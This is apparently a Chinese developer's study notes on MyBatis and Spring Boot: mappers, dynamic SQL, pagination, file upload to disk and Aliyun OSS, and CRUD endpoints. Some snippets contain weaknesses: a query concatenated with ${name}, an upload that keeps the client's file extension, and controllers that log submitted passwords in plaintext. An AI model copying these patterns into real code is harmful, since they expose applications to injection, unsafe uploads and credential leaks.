package com.wwwtty.mybatisdemo.mapper;import com.wwwtty.mybatisdemo.pojo.User;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Select;import java.util.List;@Mapperpublic interface UserMapper &#123;        @Select(&quot;select* from user&quot;)        public List&lt;User&gt; list();&#125;

进行单元测试
package com.wwwtty.mybatisdemo;import com.wwwtty.mybatisdemo.mapper.UserMapper;import com.wwwtty.mybatisdemo.pojo.User;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import java.util.List;@SpringBootTestclass MybatisDemoApplicationTests &#123;        @Autowired        UserMapper userMapper;        @Test        public void UserListTest()&#123;                List&lt;User&gt; list = userMapper.list();                list.stream().forEach(user -&gt;&#123;                        System.out.println(user);                &#125;);        &#125;&#125;

@SpringBootTest进行单元测试时，也会加载整个springboot环境

配置sql提示





功能强大qaq：

JDBC（面向接口编程）
JDBC只提供接口，由数据库厂商实现具体方法
 
缺点：


数据库连接池
 



实现了DataSource接口

切换连接池只需要引入maven依赖

&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;1.2.8&lt;/version&gt;&lt;/dependency&gt;

本地测试还得在properties文件加上：
spring.datasource.type=com.alibaba.druid.pool.DruidDataSource

才能：

或者：
由于我的springboot版本为：

因此坐标中的druid-spring-boot-starter应该改成druid-spring-boot-3-starter
&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;druid-spring-boot-3-starter&lt;/artifactId&gt;    &lt;version&gt;1.2.22&lt;/version&gt;&lt;/dependency&gt;


另一种配置方式

lombokpojo类算上getter&#x2F;setter等方法之后，太过于臃肿


引入依赖&lt;dependency&gt;    &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;    &lt;artifactId&gt;lombok&lt;/artifactId&gt;&lt;/dependency&gt;

@Data包含了@Getter，@Setter，@ToString，@EqualsAndHashCode
不包含构造器
package com.wwwtty.mybatisdemo.pojo;import lombok.AllArgsConstructor;import lombok.Data;import lombok.Getter;import lombok.NoArgsConstructor;@Data@NoArgsConstructor@AllArgsConstructorpublic class User &#123;        private Integer id;        private String username;        private String password;        private String email;&#125;


上述注解的作用在于根据注解生成一系列方法
User的字节码文件反编译：


Mybatis基础操作删除操作@Deletepackage com.wwwtty.basic_op.Mapper;import org.apache.ibatis.annotations.Delete;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Delete(&quot;delete from emp where id = 1&quot;)        void delete();&#125;

这么做的局限性是，id是静态的，但是前端传进来的id参数肯定是动态的
传递参数在@Delete中将参数用#&#123;&#125;包围

package com.wwwtty.basic_op.Mapper;import org.apache.ibatis.annotations.Delete;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Delete(&quot;delete from emp where id = #&#123;id&#125;&quot;)        void delete(Integer id);&#125;

如何拿到影响的记录数呢，改一下返回值就可以
package com.wwwtty.basic_op.Mapper;import org.apache.ibatis.annotations.Delete;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Delete(&quot;delete from emp where id = 1&quot;)        Integer delete();&#125;

@Testvoid contextLoads() &#123;    System.out.println(empMapper.delete(5));&#125;


测试表内容如下：

用@Autowired注入
package com.wwwtty.basic_op;import com.wwwtty.basic_op.Mapper.EmpMapper;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass BasicOpApplicationTests &#123;        @Autowired        private EmpMapper empMapper;        @Test        void contextLoads() &#123;                empMapper.delete(5);        &#125;&#125;


Mybatis日志输出#mybatis日志输出,输出到控制台mybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl

运行结果：
使用了参数化查询技术（预编译查询）
预编译SQL优势
参数占位符
新增操作@Insertinsert中的字段太多，可以直接封装成一个对象
用lombok封装getter&#x2F;setter等方法

package com.wwwtty.mybatis_insert.Mapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.apache.ibatis.annotations.Insert;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Insert(&quot;insert into emp (id,name,email) values (#&#123;id&#125;,#&#123;name&#125;,#&#123;email&#125;)&quot;)        void Insert(Emp emp);&#125;

package com.wwwtty.mybatis_insert;import com.wwwtty.mybatis_insert.Mapper.EmpMapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass MybatisInsertApplicationTests &#123;        @Autowired        EmpMapper empMapper;        @Test        void contextLoads() &#123;                Emp emp = new Emp();                emp.setId(5);                emp.setEmail(&quot;114514@acceed.com&quot;);                emp.setName(&quot;淳平&quot;);                empMapper.Insert(emp);        &#125;&#125;

日志输出：

主键返回
@Optionspackage com.wwwtty.mybatis_insert.Mapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.apache.ibatis.annotations.Insert;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Options;@Mapperpublic interface EmpMapper &#123;        /*        * keyProperty:主键值赋值给实体类哪个对象        * useGeneratedKeys:获取主键值        * */        @Options(keyProperty = &quot;id&quot;, useGeneratedKeys = true)        @Insert(&quot;insert into emp (name,email) values (#&#123;name&#125;,#&#123;email&#125;)&quot;)        void Insert(Emp emp);&#125;

这样一来getId()就不会返回null
package com.wwwtty.mybatis_insert;import com.wwwtty.mybatis_insert.Mapper.EmpMapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass MybatisInsertApplicationTests &#123;        @Autowired        EmpMapper empMapper;        @Test        void contextLoads() &#123;                Emp emp = new Emp();//                emp.setId(5);                emp.setEmail(&quot;114514@acceed.com&quot;);                emp.setName(&quot;林丹&quot;);                empMapper.Insert(emp);                System.out.println(emp.getId());        &#125;&#125;


更新操作@Update
package com.wwwtty.mybatis_update.Mapper;import com.wwwtty.mybatis_update.pojo.Emp;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Update;@Mapperpublic interface EmpMapper &#123;        @Update(&quot;update emp set name=#&#123;name&#125;,email=#&#123;email&#125; where id=#&#123;id&#125;&quot;)        void update(Emp emp);&#125;

执行结果：


查询操作package com.wwwtty.mybatis_select.Mapper;import com.wwwtty.mybatis_select.pojo.Emp;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Select;import java.util.List;@Mapperpublic interface EmpMapper &#123;        @Select(&quot;select* from emp where id = #&#123;id&#125;&quot;)        List&lt;Emp&gt; getById(Integer id);&#125;

package com.wwwtty.mybatis_select;import com.wwwtty.mybatis_select.Mapper.EmpMapper;import com.wwwtty.mybatis_select.pojo.Emp;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass MybatisSelectApplicationTests &#123;        @Autowired        EmpMapper empMapper;        @Test        void contextLoads() &#123;                Emp emp = new Emp();                emp.setId(5);                System.out.println(empMapper.getById(5));        &#125;&#125;

运行结果：

数据封装

@Results，@Result/** column:字段名* property:类中属性名* */@Results(&#123;    @Result(column = &quot;&quot;,property = &quot;&quot;),    @Result(column = &quot;&quot;,property = &quot;&quot;)&#125;)

开启mybatis驼峰命名自动映射开关 a_column -&gt; aColumn#开启mybatis驼峰命名自动映射开关(直接搜索骆驼(camel))mybatis.configuration.map-underscore-to-camel-case=true

条件查询

select * from user where name like &#x27;%张%&#x27; and gender=1 and entrydate between &#x27;2010-01-01&#x27; and &#x27;2020-01-01&#x27; order by update_time desc

这些参数不好封装到一个对象中去，直接传参数
@Select(&quot;select * from user where name like &#x27;%$&#123;name&#125;%&#x27; and gender=#&#123;gender&#125; and &quot; +        &quot;entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc&quot;)List&lt;User&gt; list(String name, Short gender, LocalDate begin,LocalDate end);

进行模糊匹配的时候，要用’%%’的形式，这样就不能用预编译的#{}(占位符不能出现在引号内)，需要用拼接sql的${}(不推荐)
@Test    void test() &#123;    List&lt;User&gt; res = empMapper.list(&quot;张&quot;, (short) 1, LocalDate.of(2010, 1, 1), LocalDate.of(2020, 1, 1));    res.stream().forEach(user -&gt; &#123;    	System.out.println(user);    &#125;);&#125;


怎么解决拼接的问题
concat()@Select(&quot;select * from user where name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;) and gender=#&#123;gender&#125; and &quot; +        &quot;entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc&quot;)List&lt;User&gt; list(String name, Short gender, LocalDate begin,LocalDate end);


早期版本不会保留形参名

XML映射文件

与包名一致

与接口名一致

xml文件的约束：https://mybatis.p2hp.com/getting-started.html
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;&quot;&gt;                        &lt;/select&gt;&lt;/mapper&gt;

获取全类名：

原查询语句：
@Select(&quot;select * from user where name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;) and gender=#&#123;gender&#125; and &quot; +        &quot;entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc&quot;)List&lt;User&gt; list(String name, Short gender, LocalDate begin,LocalDate end);



改用xml映射的方式：
如果xml中sql语句没有高亮，上下文操作中选择注入语言
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;com.wwwtty.xml_reflect.pojo.User&quot;&gt;                select * from user where name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;) and gender=#&#123;gender&#125; and                entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc        &lt;/select&gt;&lt;/mapper&gt;

xml映射适合于复杂sql
动态sql
&lt; if &gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;com.wwwtty.xml_reflect.pojo.User&quot;&gt;                select *                from user                where                &lt;if test=&quot;name != null&quot;&gt;                        name like concat(&#x27;%&#x27;, #&#123;name&#125;, &#x27;%&#x27;)                &lt;/if&gt;                &lt;if test=&quot;gender != null&quot;&gt;                        and gender = #&#123;gender&#125;                &lt;/if&gt;                &lt;if test=&quot;begin != null and end != null&quot;&gt;                        and entrydate between #&#123;begin&#125; and #&#123;end&#125;                &lt;/if&gt;                order by update_time desc        &lt;/select&gt;&lt;/mapper&gt;

empMapper.list(name,null,null,end);

相应的sql语句：

&lt; where &gt;在上面的例子中，如果我们只筛选性别：

但是这个and还很不好删除（容易别的地方出错）
作用：根据if的结果（子元素），自动添加&#x2F;删除where；同时自动删除多余的and和or
使用&lt; where &gt;解决
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;com.wwwtty.xml_reflect.pojo.User&quot;&gt;                        select *                        from user                            &lt;where&gt;                                    &lt;if test=&quot;name != null&quot;&gt;                                            name like concat(&#x27;%&#x27;, #&#123;name&#125;, &#x27;%&#x27;)                                    &lt;/if&gt;                                    &lt;if test=&quot;gender != null&quot;&gt;                                            and gender = #&#123;gender&#125;                                    &lt;/if&gt;                                    &lt;if test=&quot;begin != null and end != null&quot;&gt;                                            and entrydate between #&#123;begin&#125; and #&#123;end&#125;                                    &lt;/if&gt;                                    order by update_time desc                            &lt;/where&gt;        &lt;/select&gt;&lt;/mapper&gt;

运行生成的sql：

&lt; set &gt;去除set中多余的逗号
案例:动态更新如果我们这样写动态更新的xml配置文件
&lt;update id=&quot;update&quot;&gt;    update user    set    &lt;if test=&quot;username != null&quot;&gt;        username=#&#123;username&#125;,    &lt;/if&gt;    &lt;if test=&quot;password != null&quot;&gt;        password=#&#123;password&#125;,    &lt;/if&gt;    &lt;if test=&quot;name != null&quot;&gt;        name=#&#123;name&#125;,    &lt;/if&gt;    &lt;if test=&quot;gender != null&quot;&gt;        gender=#&#123;gender&#125;,    &lt;/if&gt;    &lt;if test=&quot;image != null&quot;&gt;        image=#&#123;image&#125;,    &lt;/if&gt;    &lt;if test=&quot;job != null&quot;&gt;        job=#&#123;job&#125;,    &lt;/if&gt;    &lt;if test=&quot;entrydate != null&quot;&gt;        entrydate=#&#123;entrydate&#125;,    &lt;/if&gt;    &lt;if test=&quot;deptId != null&quot;&gt;        dept_id=#&#123;deptId&#125;,    &lt;/if&gt;    &lt;if test=&quot;createDate != null&quot;&gt;        create_time=#&#123;createTime&#125;,    &lt;/if&gt;    &lt;if test=&quot;updateTime != null&quot;&gt;        update_time=#&#123;updateTime&#125;    &lt;/if&gt;    where id = #&#123;id&#125;&lt;/update&gt;


会有多一个逗号的情况
使用 &lt; set &gt;解决
 
&lt; foreach &gt;场景：批量删除
delete from user where id in(3,4,5);

void deleteByIds(List&lt;Integer&gt; list);

&lt;delete id=&quot;deleteByIds&quot;&gt;    &lt;foreach collection=&quot;&quot; item=&quot;&quot; separator=&quot;&quot; open=&quot;&quot; close=&quot;&quot;&gt;    &lt;/foreach&gt;&lt;/delete&gt;


collection:要遍历的集合

item:遍历出的元素

separator:分隔符

open:遍历开始前拼接的sql片段

close:遍历结束后拼接的sql片段
  &lt;!--    delete from user where id in(3,4,5)    --&gt;&lt;delete id=&quot;deleteByIds&quot;&gt;    delete from user where id in    &lt;foreach collection=&quot;list&quot; item=&quot;id&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt;        #&#123;id&#125;    &lt;/foreach&gt;&lt;/delete&gt;

&lt; sql &gt;&lt; sql &gt;用于封装一些重复使用的sql片段，并分配一个唯一的id
&lt; include &gt;用&lt; include &gt;包含&lt; sql &gt;封装的sql片段，用refid&#x3D;id从而完成包含
void selectArgs();void selectById();



&lt;sql id=&quot;basicSelect&quot;&gt;    select username,    password,    name,    gender,    id,    username,    password,    name,    gender,    image,    job,    entrydate,    dept_id,    create_time,    update_time    from user&lt;/sql&gt;&lt;select id=&quot;selectArgs&quot;&gt;    &lt;include refid=&quot;basicSelect&quot; /&gt;&lt;/select&gt;&lt;select id=&quot;selectById&quot;&gt;    &lt;include refid=&quot;basicSelect&quot; /&gt;&lt;/select&gt;


文件上传前端表单：&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;    &lt;input type=&quot;password&quot; name=&quot;passwd&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;    &lt;button type=&quot;submit&quot;&gt;submit&lt;/button&gt;&lt;/form&gt;


若不指定enctype&#x3D;”multipart&#x2F;form-data”,上传时只会上传文件名


改成enctype&#x3D;”multipart&#x2F;form-data”

请求中有了文件内容


后端:@Slf4j@RestControllerpublic class UploadController &#123;        @PostMapping(&quot;/upload&quot;)        public Result upload(String name,String passwd,@RequestParam(&quot;file&quot;) MultipartFile image)&#123;                log.info(&quot;用户名:&#123;&#125;,密码:&#123;&#125;,收到文件:&#123;&#125;&quot;,name,passwd,image);                return Result.success();        &#125;&#125;

进行测试:

本地存储服务端，接收到上传的文件后，存储在本地服务器磁盘
demo:在static目录下新建了一个upload目录

@Slf4j@RestControllerpublic class UploadController &#123;        @PostMapping(&quot;/upload&quot;)        public Result upload(String name,String passwd,@RequestParam(&quot;file&quot;) MultipartFile image) throws Exception &#123;                log.info(&quot;用户名:&#123;&#125;,密码:&#123;&#125;,收到文件:&#123;&#125;&quot;,name,passwd,image);                //获取原始文件名                String fileName =  image.getOriginalFilename();                //本地存储                image.transferTo(new File(&quot;static/upload&quot;+fileName));                                return Result.success();        &#125;&#125;

postman测试


存在问题:如果两个用户上传了相同名字的文件，那么就覆盖了
所以我们需要构造唯一的文件名
使用uuid@Testvoid contextLoads() &#123;    String uuid = UUID.randomUUID().toString();    System.out.println(uuid);&#125;

简单的解决:(这么做有漏洞)@PostMapping(&quot;/upload&quot;)public Result upload(String name,String passwd,@RequestParam(&quot;file&quot;) MultipartFile image) throws Exception &#123;    log.info(&quot;用户名:&#123;&#125;,密码:&#123;&#125;,收到文件:&#123;&#125;&quot;,name,passwd,image);    //获取原始文件名    String originalFilename =  image.getOriginalFilename();    //最后一个.的位置    int index = originalFilename.lastIndexOf(&#x27;.&#x27;);    //获取拓展名    String extName = originalFilename.substring(index);    //拼接文件名    String fileName = UUID.randomUUID().toString()+extName;    //本地存储    image.transferTo(new File(&quot;D:\\JavaWeb\\Spring-Mybatis-demo\\src\\main\\resources\\static\\upload\\&quot;+fileName));    return Result.success();&#125;

如果上传一个大文件

这是因为

application.properties中
#单个文件限制大小spring.servlet.multipart.max-file-size=10MB#单个请求上传大小spring.servlet.multipart.max-request-size=100MB


云存储
官方文档
文件上传SDK
复制官方代码
获取endpoint
设置上传到OSS中的文件名以及要上传的文件路径// 在OSS中叫什么名字String objectName = &quot;test.md&quot;;// 填写本地文件的完整路径，例如D:\\localpath\\examplefile.txt。// 如果未指定本地路径，则默认从示例程序所属项目对应本地路径中上传文件流。String filePath= &quot;D:\\My_Blogs\\myblogs\\source\\_posts\\Vue.md&quot;;// 填写Bucket所在地域。以华东1（杭州）为例，Region填写为cn-hangzhou。


bucket文件列表中查看

集成Aliyun-OSS接口文档


工具类AliOSSUtils官方代码改写
没有写成静态方法，就用IOC容器注入;工具类不属于三层架构，直接使用@Component注解
@Slf4j@Componentpublic class AliOSSUtils &#123;        // 获取上传的文件的输入流        // Endpoint以华东1（杭州）为例，其它Region请按实际情况填写。        String endpoint = &quot;https://oss-cn-chengdu.aliyuncs.com&quot;;        // 从环境变量中获取访问凭证。运行本代码示例之前，请确保已设置环境变量OSS_ACCESS_KEY_ID和OSS_ACCESS_KEY_SECRET。        String bucketName = &quot;k4n9l4n&quot;;        String region = &quot;cn-chengdu&quot;;        /**         * 实现上传图片到OSS         */        public String upload(MultipartFile file) throws Exception &#123;                String oringinalFileName = file.getOriginalFilename();                String fileName = UUID.randomUUID().toString()+oringinalFileName.substring(oringinalFileName.lastIndexOf(&quot;.&quot;));                EnvironmentVariableCredentialsProvider credentialsProvider = CredentialsProviderFactory.newEnvironmentVariableCredentialsProvider();                // 创建OSSClient实例。                // 当OSSClient实例不再使用时，调用shutdown方法以释放资源。                ClientBuilderConfiguration clientBuilderConfiguration = new ClientBuilderConfiguration();                clientBuilderConfiguration.setSignatureVersion(SignVersion.V4);                OSS ossClient = OSSClientBuilder.create()                        .endpoint(endpoint)                        .credentialsProvider(credentialsProvider)                        .clientConfiguration(clientBuilderConfiguration)                        .region(region)                        .build();                try &#123;                        InputStream inputStream = file.getInputStream();                        // 创建PutObjectRequest对象。                        PutObjectRequest putObjectRequest = new PutObjectRequest(bucketName, fileName, inputStream);                        // 创建PutObject请求。                        PutObjectResult result = ossClient.putObject(putObjectRequest);                        String url = endpoint.split(&quot;//&quot;)[0]+&quot;//&quot;+bucketName+&quot;.&quot;+endpoint.split(&quot;//&quot;)[1]+&quot;/&quot;+fileName;                        return url;                &#125; catch (OSSException oe) &#123;                        log.info(&quot;Caught an OSSException, which means your request made it to OSS, &quot;                                + &quot;but was rejected with an error response for some reason.&quot;);                        log.info(&quot;Error Message:&quot; + oe.getErrorMessage());                        log.info(&quot;Error Code:&quot; + oe.getErrorCode());                        log.info(&quot;Request ID:&quot; + oe.getRequestId());                        log.info(&quot;Host ID:&quot; + oe.getHostId());                &#125; catch (ClientException ce) &#123;                        log.info(&quot;Caught an ClientException, which means the client encountered &quot;                                + &quot;a serious internal problem while trying to communicate with OSS, &quot;                                + &quot;such as not being able to access the network.&quot;);                        log.info(&quot;Error Message:&quot; + ce.getMessage());                &#125; finally &#123;                        if (ossClient != null) &#123;                                ossClient.shutdown();                        &#125;                &#125;                return null;        &#125;&#125;

Controller层@Slf4j@RestController@RequestMapping(&quot;/upload&quot;)public class UploadController &#123;        @Autowired        private AliOSSUtils aliOSSUtils;        @PostMapping        public Result upload(MultipartFile image) throws Exception &#123;                log.info(&quot;接受到文件:&#123;&#125;&quot;,image.getOriginalFilename());                String url = aliOSSUtils.upload(image);                if(url != null)&#123;                        log.info(&quot;上传文件的url:&#123;&#125;&quot;,url);                        return Result.success(url);                &#125;                return Result.error(&quot;上传出错&quot;);        &#125;&#125;

测试

案例
开发规范
Restful

统一响应结果
开发流程
部门管理部门管理-查询接口文档：

//使用该注解就不用自己new日志对象@Slf4j@RestControllerpublic class deptController &#123;        @RequestMapping(&quot;/dept&quot;)        public Result list()&#123;                log.info(&quot;查询所有部门信息&quot;);                return Result.Success();        &#125;&#125;

ps：构建项目时不要选lombok，否则要在pom.xml中注释以下内容：

否则报错：

postman测试：
日志输出：
指定请求方法@RequestMapping(value = &quot;/depts&quot;,method = RequestMethod.GET)//简化版本 @GetMapping(&quot;depts&quot;)

注入依赖Controller层
@Slf4j@RestControllerpublic class deptController &#123;        @Autowired        private deptService service;        @GetMapping(&quot;depts&quot;)        public Result list() &#123;                log.info(&quot;查询所有部门信息&quot;);                //查询所有部门信息                List&lt;Dept&gt; deptList = service.list();                return Result.success(deptList);        &#125;&#125;

Service层
@Servicepublic class deptImpl implements deptService &#123;        @Autowired        private deptMapper mapper;        @Override        public List&lt;Dept&gt; list() &#123;                return mapper.list();        &#125;&#125;

Mapper层
@Mapperpublic interface deptMapper &#123;        @Select(&quot;select * from dept&quot;)        public List&lt;Dept&gt; list();&#125;


部门管理-删除接口文档
流程
Controller层@DeleteMapping(&quot;/depts/&#123;id&#125;&quot;)public Result delete(@PathVariable Integer id)&#123;    log.info(&quot;根据id删除部门:&#123;&#125;&quot;,id);    service.delete(id);    return Result.success();&#125;



Service层@Overridepublic void delete(Integer id) &#123;    mapper.deleteById(id);&#125;



Mapper层@Delete(&quot;delete from dept where id=#&#123;id&#125;&quot;)void deleteById(Integer id);

postman测试
执行结果

部门管理-新增接口文档

Controller层@PostMapping(&quot;/depts&quot;)public Result add(@RequestBody Dept dept)&#123;    log.info(&quot;新增部门&#123;&#125;&quot;,dept);    service.add(dept);    return Result.success();&#125;



Service层@Overridepublic void add(Dept dept)&#123;    dept.setCreateTime(LocalDate.now());    dept.setUpdateTime(LocalDate.now());    mapper.insert(dept);&#125;



Mapper层@Insert(&quot;insert into dept (name,create_time,update_time) values (#&#123;name&#125;,#&#123;createTime&#125;,#&#123;updateTime&#125;)&quot;)void insert(Dept dept);



postman测试
结果

简化RequestMapping

员工管理分页查询分析
接口文档




封装实体类
@Data@NoArgsConstructor@AllArgsConstructorpublic class pageBean &#123;        private Long total;        private List rows;&#125;

实现Mapper层@Mapperpublic interface EmpMapper &#123;        /**         * 查询总记录数         * @return         */        @Select(&quot;select count(*) from emp&quot;)         Long count();        /**         *         * @param page:起始页         * @param pageSize:查多少页         * @return         */        @Select(&quot;select * from emp limit #&#123;page&#125;,#&#123;pageSize&#125;&quot;)         List&lt;Emp&gt; page(Integer page,Integer pageSize);&#125;

Service层@Servicepublic class empImpl implements empService &#123;        @Autowired        EmpMapper empMapper;        @Override        public PageBean page(Integer page, Integer pageSize) &#123;                Long total = empMapper.count();                Integer start = (page - 1) * pageSize;                List&lt;Emp&gt; rows = empMapper.page(start, pageSize);                //封装pageBean                PageBean pageBean = new PageBean(total,rows);                return pageBean;        &#125;&#125;



Controller层
用@RequestParam(defaultValue&#x3D;””)设置参数默认值
@RestControllerpublic class empController &#123;        @GetMapping(&quot;/emps&quot;)        public Result page(@RequestParam(defaultValue = &quot;1&quot;) Integer page, @RequestParam(defaultValue = &quot;10&quot;) Integer pageSize)&#123;                return new Result();        &#125;&#125;

日志输出
log.info(&quot;分页查询,分页查询页码为&#123;&#125;,每页记录数为&#123;&#125;&quot;,page,pageSize);

调用Service层
PageBean pageBean = empservice.page(page,pageSize);

@Slf4j@RestControllerpublic class empController &#123;        @Autowired        empService empservice;        @GetMapping(&quot;/emps&quot;)        public Result page(@RequestParam(defaultValue = &quot;1&quot;) Integer page, @RequestParam(defaultValue = &quot;10&quot;) Integer pageSize)&#123;                log.info(&quot;分页查询,起始&#123;&#125;,查询&#123;&#125;页&quot;,page,pageSize);//                调用service层                PageBean pageBean = empservice.page(page,pageSize);                return Result.success(pageBean);        &#125;&#125;

测试postman

前后端联调

PageHelper插件
引入依赖
这里的版本不能按照课件的1.4.2，否则会强转异常(ClassCastException)
&lt;dependency&gt;    &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;    &lt;artifactId&gt;pagehelper-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;1.4.6&lt;/version&gt;&lt;/dependency&gt;

EmpMapper
@Select(&quot;select* from emp&quot;)List&lt;Emp&gt; list();

EmpServer的实现类
@Overridepublic PageBean page(Integer page, Integer pageSize) &#123;    //设置分页参数    PageHelper.startPage(page,pageSize);    //执行查询    List&lt;Emp&gt; empList = empMapper.list();    Page&lt;Emp&gt; page1 = (Page&lt;Emp&gt;)empList;    //封装bean对象    PageBean pageBean = new PageBean(page1.getTotal(),page1.getResult());    return pageBean;&#125;

条件分页查询接口文档
Controller//方法声明public Result page(    @RequestParam(required = false) String name,    @RequestParam(required = false) Short gender,    @RequestParam(required = false) @DateTimeFormat(pattern = &quot;yyyy-MM-dd&quot;) LocalDate begin,     @RequestParam(required = false) @DateTimeFormat(pattern = &quot;yyyy-MM-dd&quot;) LocalDate end, 					                         @RequestParam(defaultValue = &quot;1&quot;) Integer page,     @RequestParam(defaultValue = &quot;10&quot;) Integer pageSize)

Service层@Overridepublic PageBean page(String name, Short gender, LocalDate begin, LocalDate end, Integer page, Integer pageSize) &#123;    PageHelper.startPage(page,pageSize);    List&lt;Emp&gt;  empList = empMapper.page(name, gender, begin, end);    Page&lt;Emp&gt; empPage = (Page&lt;Emp&gt;) empList;    PageBean pageBean = new PageBean(empPage.getTotal(), empPage.getResult());    return pageBean;&#125;

Mapper层/*** @param name* @param gender* @param begin 起始create_time* @param end   中止create_time* @return*/List&lt;Emp&gt; page(String name, Short gender, LocalDate begin, LocalDate end);

使用了PageHelper之后，Mapper中就不要再使用page与pageSize参数，否则会导致生成的sql变为
SELECT count(0) FROM emp LIMIT ?, ?

就查不到了
XML映射文件&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.springmybatisdemo.Mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;page&quot; resultType=&quot;com.wwwtty.springmybatisdemo.pojo.Emp&quot;&gt;            select * from emp                &lt;where&gt;                    	&lt;!-- 这里还需要判断空字符串，否则会多拼上name like %% --&gt;                        &lt;if test=&quot;name != null and name != &#x27;&#x27;&quot;&gt;                            name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;)                        &lt;/if&gt;                        &lt;if test=&quot;gender != null&quot;&gt;                            and gender = #&#123;gender&#125;                        &lt;/if&gt;                        &lt;if test=&quot;begin != null and end != null&quot;&gt;                            and entrydate between #&#123;begin&#125; and #&#123;end&#125;                        &lt;/if&gt;                &lt;/where&gt;        &lt;/select&gt;&lt;/mapper&gt;

删除员工接口文档


